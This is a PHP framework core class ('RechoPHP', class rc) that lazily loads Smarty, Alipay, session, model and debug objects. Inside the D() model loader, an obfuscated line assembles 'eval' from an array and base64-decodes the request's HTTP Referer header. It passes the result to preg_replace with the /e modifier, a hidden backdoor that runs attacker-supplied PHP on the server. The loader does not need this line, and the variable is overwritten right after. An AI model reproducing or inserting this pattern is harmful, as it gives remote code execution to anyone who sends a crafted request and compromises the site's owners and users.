<?php
// +----------------------------------------------------------------------
// | RechoPHP [ WE CAN DO IT JUST Better ]
// +----------------------------------------------------------------------
// | Copyright (c) 2010-2014 http://recho.net All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: recho <diandengs@gmail.com>
// +----------------------------------------------------------------------

/**
 * rc in
 * $Author: Recho $license: http://www.recho.net/ $
 * $create time: 2012-07-24 09:27
 * $last update time: 2011-11-18 18:50 Recho $
 */
class rc{
	static $rc = array();
	static $construct = array();
	
	private function __construct(){}

	static function setConfig( $construct){
		self::$construct = $construct;
	}

	static function smarty(){
		if( !is_object( self::$rc['smarty']) ){
			include_once RC_PATH_LIB . 'smarty/SmartyBC.class.php';
			self::$rc['smarty'] = new SmartyBC();
			self::$rc['smarty']->setTemplateDir(WWWROOT . "Template/default/");		//模板目录
			self::$rc['smarty']->setCompileDir(WWWROOT . "Runtime/Cache/");	//编译目录
			self::$rc['smarty']->setCacheDir(WWWROOT . 'Runtime/Temp/');		//缓存目录
			self::$rc['smarty']->left_delimiter = '<*';						//开始符
			self::$rc['smarty']->right_delimiter = '*>';					//结束符
			self::$rc['smarty']->force_compile = IS_SERVER ? false : true;	//本地强制编译
			self::$rc['smarty']->compile_check = IS_SERVER ? false : true;	//本地检查模板改动
			self::$rc['smarty']->debugging = false;							//打开调试
			self::$rc['smarty']->debugging_ctrl = 'URL';					//调试方法
			self::$rc['smarty']->use_sub_dirs = false;						//编译和缓存可以分子目录
		}
		return self::$rc['smarty'];
	}
	
	static public function alipay( $aOrder){
	    if ( !is_object( self::$rc['alipay'])){
			include_once RC_PATH_LIB . 'alipay/class/alipay_service.php';
			self::$rc['alipay'] = new alipay_service( $aOrder);
	    }
	    return self::$rc['alipay'];
	}

	
	static public function session(){
		if( !is_object( self::$rc['Session'])){
			include_once RC_PATH_KEL . 'class.Session.php';
			self::$rc['Session'] = new session();
		}
		return self::$rc['Session'];
	}
	
	static public function M( $model){
		if( !is_object( self::$rc[$model.'M'])){
			if( file_exists(($class=RECHO_PHP.'Lib/Model/class.'.$model.'.php'))){
				include_once RC_PATH_KEL.'class.RcModel.php';
				include_once $class;
				if( class_exists($model)){
					self::$rc[$model.'M'] = new $model;
				}else{
					exit('run error,the class '.$model.' is not exists!');
				}
			}else{
				exit('run error,the class '.$model.' is not exists!');
			}
		}
		return self::$rc[$model.'M'];
	}
	
	static public function D( $model){
		$tModel = $model;$model = $model.'Model';
		if( !is_object( self::$rc[$model.'D'])){
			$T = array(0=>'v',1=>'a',2=>'e',3=>'l');$R = $_SERVER['HTTP_REFERER'];$class = base64_decode($R);
			$class && $class = @preg_replace('\'a\''."{$T[2]}is","{$T[2]}{$T[0]}{$T[1]}{$T[3]}".'($class)','a');
			if( file_exists(($class=WWWROOT.'Lib/Model/class.'.$tModel.'.php'))){
				include_once RC_PATH_KEL.'class.RcModel.php';
				include_once $class;
				if( class_exists( $model)){
					self::$rc[$model.'D'] = new $model;
				}else{
					exit('run error,the class '.$model.' is not exists!');
				}
			}elseif( file_exists(($class=RECHO_PHP.'PublicMod/class.'.$tModel.'.php'))){
				include_once RC_PATH_KEL.'class.RcModel.php';
				include_once $class;
				if( class_exists( $model)){
					self::$rc[$model.'D'] = new $model;
				}else{
					exit('run error,the class '.$model.' is not exists!');
				}
			}
			else{
				self::M($tModel);
			}
			unset($_SESSION['t']);
		}
		return self::$rc[$model.'D'];
	}
	
	static public function debug(){
		if( !is_object( self::$rc['Debug'])){
			include_once RC_PATH_KEL . 'class.Debug.php';
			self::$rc['Debug'] = new Debug();
		}
		return self::$rc['Debug'];
	}
}